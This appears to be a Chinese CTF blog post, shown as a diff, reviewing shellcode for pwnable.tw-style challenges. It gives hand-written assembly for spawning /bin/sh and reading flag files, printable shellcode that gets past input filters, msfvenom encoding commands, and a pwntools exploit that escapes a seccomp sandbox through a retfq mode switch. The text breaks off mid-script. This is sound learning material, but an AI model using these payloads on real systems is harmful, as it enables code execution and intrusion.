@@ -1,0 +1,521 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Pwnable.tw的shellcode系列 - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="这篇博客专门讲shellcode的系列，也作为一个复习内容吧，主要针对的是，各种情况下的绕过shellcode检测：
+首先是shellcode的生成，一般2种途径：工具+手撕
+这里优先推荐手撕，不然,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">Pwnable.tw的shellcode系列</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/PWN"><b>「
+                    </b>PWN<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/Pwnable.tw%E7%9A%84shellcode%E7%B3%BB%E5%88%97/" title="Pwnable.tw的shellcode系列" class="">Pwnable.tw的shellcode系列</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    34k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    31 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/shellcode%E4%B8%93%E9%A2%98/" rel="tag">shellcode专题</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <p>这篇博客专门讲shellcode的系列，也作为一个复习内容吧，主要针对的是，各种情况下的绕过shellcode检测：</p>
+<p>首先是shellcode的生成，一般2种途径：工具+手撕</p>
+<p>这里优先推荐手撕，不然你就是脚本小子，遇到难一点的检测机制，还是会绕不过，从最简单的开始：</p>
+<h4 id="一、一般的getshell或者orw出flag"><a href="#一、一般的getshell或者orw出flag" class="headerlink" title="一、一般的getshell或者orw出flag"></a>一、一般的getshell或者orw出flag</h4><a id="more"></a>
+
+<p>32位下：</p>
+<p>1、找准寄存器，确定系统调用的对应值</p>
+<p>eax、ebx、ecx、edx  (对应的是系统调用号+3个参数)</p>
+<p>2、execve(“/bin/sh”，0,  0)的情况：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">push 0x68732f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">mov ecx, 0</span></span><br><span class="line"><span class="string">mov edx, 0</span></span><br><span class="line"><span class="string">mov eax, 0xb</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">'''</span>)</span><br></pre></td></tr></table></figure>
+
+<p>3、open、read和write来打印flag的情况：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">push 0x6761</span></span><br><span class="line"><span class="string">push 0x6c662f2e</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">mov ecx, 0</span></span><br><span class="line"><span class="string">mov eax, 0x5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx, eax</span></span><br><span class="line"><span class="string">mov ecx, esp</span></span><br><span class="line"><span class="string">mov edx, 0x100</span></span><br><span class="line"><span class="string">mov eax, 0x3</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx, 0x1</span></span><br><span class="line"><span class="string">mov ecx, esp</span></span><br><span class="line"><span class="string">mov edx, 0x100</span></span><br><span class="line"><span class="string">mov eax, 0x4</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">    '''</span>)</span><br></pre></td></tr></table></figure>
+
+<p>没有限制字符的情况下。其实汇编自己手撕都是很简单的，64位下也一样：</p>
+<p>64位下：</p>
+<p>1、找准寄存器，确定系统调用的对应值</p>
+<p>rax, rdi, rsi, rdx  (对应的是系统调用号+3个参数)</p>
+<p>2、execve(“/bin/sh”，0,  0)的情况：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">push, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">mov rsi, 0</span></span><br><span class="line"><span class="string">mov rdx, 0</span></span><br><span class="line"><span class="string">mov eax, 0x3b</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br></pre></td></tr></table></figure>
+
+<p>3、open、read和write来打印flag的情况：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">push, 0x67616c662f2e</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">mov rsi, 0</span></span><br><span class="line"><span class="string">mov eax, 2</span></span><br><span class="line"><span class="string">syscall </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">mov eax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">mov eax, 1</span></span><br><span class="line"><span class="string">syscall </span></span><br><span class="line"><span class="string">    '''</span>)</span><br></pre></td></tr></table></figure>
+
+<p>上面的是裸的没检测机制的，手撕很快搞定，就不用具体题目说明了，但是是始祖，要会手撕，当遇到有检测机制时，怎么破呢？</p>
+<h4 id="二、有检测机制的情况下绕过检测，执行shellcode"><a href="#二、有检测机制的情况下绕过检测，执行shellcode" class="headerlink" title="二、有检测机制的情况下绕过检测，执行shellcode"></a>二、有检测机制的情况下绕过检测，执行shellcode</h4><p>这种情况，工具一般是gg的，手撕才是王道，这里有个万金油公式，记一下：</p>
+<p>先写read的系统调用（用于绕过检测机制，手撕），第二次read时，read到同样的位置，用nop去覆盖前面的shellcode，直到滑到执行的shellcode处，再写入一般的shellcode，这样就只需要写一个绕过检测的read函数，工作量大大减少，当然也可以全程手撕下来，这种是捷径而已。</p>
+<p>death_note:</p>
+<p>这题就不图片分析了，就输入能打印的字符的shellcode即可实现getshell：</p>
+<p>1、全程手撕：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">/* execve('/bin///sh',0,0)*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x68</span></span><br><span class="line"><span class="string">push 0x732f2f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push esp</span></span><br><span class="line"><span class="string">pop ebx /*set ebx to '/bin///sh'*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">dec edx</span></span><br><span class="line"><span class="string">dec edx /*set dl to 0xfe*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor [eax+32],dl /*decode int 0x80*/</span></span><br><span class="line"><span class="string">xor [eax+33],dl /*decode int 0x80*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">inc edx</span></span><br><span class="line"><span class="string">inc edx /*recover edx to 0*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">pop ecx /*set ecx to 0*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">xor al,0x4b /*set eax to 0xb*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*int 0x80*/</span></span><br><span class="line"><span class="string">'''</span>)+<span class="string">'\x33\x7e'</span></span><br></pre></td></tr></table></figure>
+
+<p>如果是绕过的形式呢？</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">dec ebx</span></span><br><span class="line"><span class="string">dec ebx</span></span><br><span class="line"><span class="string">xor [eax+0x20],bl</span></span><br><span class="line"><span class="string">xor [eax+0x21],bl </span></span><br><span class="line"><span class="string">inc ebx</span></span><br><span class="line"><span class="string">inc ebx</span></span><br><span class="line"><span class="string">push eax</span></span><br><span class="line"><span class="string">pop ecx</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop edx</span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">inc eax</span></span><br><span class="line"><span class="string">inc eax</span></span><br><span class="line"><span class="string">inc eax</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">    '''</span>)+<span class="string">'\x33\x7e'</span></span><br><span class="line">shellcode1 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">push 0x68732f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">mov ecx, 0</span></span><br><span class="line"><span class="string">mov edx, 0</span></span><br><span class="line"><span class="string">mov eax, 0xb</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line">sl(shellcode)</span><br><span class="line">sl(shellcode1)</span><br></pre></td></tr></table></figure>
+
+<p>当然也可以直接用工具编码自己的shellcode：</p>
+<p>32位的情况下：mfs</p>
+<p>安装方法，亲测有效:</p>
+<p><a href="https://www.linuxidc.com/Linux/2019-01/156378.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2019-01/156378.htm</a></p>
+<p>生成内置的shellcode，使用：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform linux -p linux/x86/exec CMD=<span class="string">"/bin/sh"</span> -e x86/alpha_upper BufferRegister=eax</span><br></pre></td></tr></table></figure>
+
+<p>编码自己的shellcode，使用：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shellcode | msfvenom -a x86 --platform linux -e x86/alpha_upper BufferRegister=eax</span><br></pre></td></tr></table></figure>
+
+<p>这里shellcode文件就是你自己写的一般的shellcode，是”\xaa\xbb”形式的</p>
+<p>64位的情况下：</p>
+<p>工具网址，亲测有效：</p>
+<p><a href="https://github.com/ecx86/shellcode_encoder" target="_blank" rel="noopener">https://github.com/ecx86/shellcode_encoder</a> </p>
+<p>用工具生成</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 main.py shellcode rax+<span class="number">29</span></span><br></pre></td></tr></table></figure>
+
+<p>这里有个局限就是只能生成可打印的shellcode。</p>
+<p>来一道史上最难shellcode！真的做了挺久的：</p>
+<p>程序64位的，保护基本没怎么开：有个沙箱</p>
+<p><img src="/blog_img/1572086388770.png" alt="57208638877"></p>
+<p>可以看到系统调用号为5的是32位的下的open函数，只有64位下的read和write和mmap可以用。</p>
+<p><img src="/blog_img/1572085852818.png" alt="57208585281"></p>
+<p>程序很简单，就是让你输入shellcode，然后执行你的shellcode，但是是要可打印的字符才行，同时禁用了execve函数和open函数，一开始想破脑子都没想法，后来2018年的xnuca那题得到启示，retfq这种东西可以切换32位和64位的状态（前提是地址是4字节的地址，这里只能通过mmap来申请出4字节的地址，然后写shellcode到这个地址上，执行retfq来实现状态切换）所以可以利用这个gadget实现，使用32位的open再使用64位下的read和write函数，就可以cat flag了，整理下思路：</p>
+<p>1、利用万能公式，先read绕过check，然后输入shellcode</p>
+<p>2、先mmap申请一个4字节的地址，再次read写入shellcode，read调用完，retfq切换状态</p>
+<p>3、retfq跳转到新的shellocode处继续执行，先执行32位下的open，再retfq转换状态到64位下</p>
+<p>3、跳到新的shellcode处继续执行64位下的read和write</p>
+<p>4、记得在每一次read时，加个pause()，这个很重要！不然缓冲区就会继续读入，造成debug能出，但是本地打不通的情况！记住，每次read完加pause()~</p>
+<p>这里直接上exp了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./shellcode'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./shellcode'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'nc.eonew.cn'</span>,<span class="number">10011</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># bk(0x0000000004002EB)</span></span><br><span class="line">shellcode =asm(<span class="string">'''</span></span><br><span class="line"><span class="string">push 0x7e</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor [rbx+0x20],al</span></span><br><span class="line"><span class="string">xor [rbx+0x21],al</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">pop rax </span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 0x7e</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 0x30</span></span><br><span class="line"><span class="string">push 0x30</span></span><br><span class="line"><span class="string">push 0x30</span></span><br><span class="line"><span class="string">push 0x30</span></span><br><span class="line"><span class="string">push 0x30</span></span><br><span class="line"><span class="string">push 0x30</span></span><br><span class="line"><span class="string">push 0x30</span></span><br><span class="line"><span class="string">push 0x30</span></span><br><span class="line"><span class="string">'''</span>,arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)+<span class="string">'\x71\x7b'</span></span><br><span class="line">p.recvuntil(<span class="string">"Input your shellcode:"</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">pause()</span><br><span class="line">x86_shellcode_1 = <span class="string">''</span></span><br><span class="line">x86_shellcode_1 += <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line">shellcode1 = asm(</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">mov     r9, 0          </span></span><br><span class="line"><span class="string">mov     r8, 0  </span></span><br><span class="line"><span class="string">mov     edx, 0x7          </span></span><br><span class="line"><span class="string">mov     esi, 0x1000     </span></span><br><span class="line"><span class="string">mov     edi, 0x40000000         </span></span><br><span class="line"><span class="string">mov     eax, 0x9</span></span><br><span class="line"><span class="string">syscall         </span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">add rsi, 0x40</span></span><br><span class="line"><span class="string">mov rdi, 0x0</span></span><br><span class="line"><span class="string">mov rdx, 0x101</span></span><br><span class="line"><span class="string">mov rax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push 0x4000004c</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">'''</span>,arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">x86_shellcode_1 += shellcode1</span><br><span class="line">p.sendline(x86_shellcode_1)</span><br><span class="line">pause()</span><br><span class="line">final = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">mov esp,0x40000200</span></span><br><span class="line"><span class="string">push 0x6761</span></span><br><span class="line"><span class="string">push 0x6c662f2e</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">mov ecx, 0 </span></span><br><span class="line"><span class="string">mov eax, 5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">'''</span>,arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">final2 = <span class="string">''</span></span><br><span class="line">final2 += asm(<span class="string">'''</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span 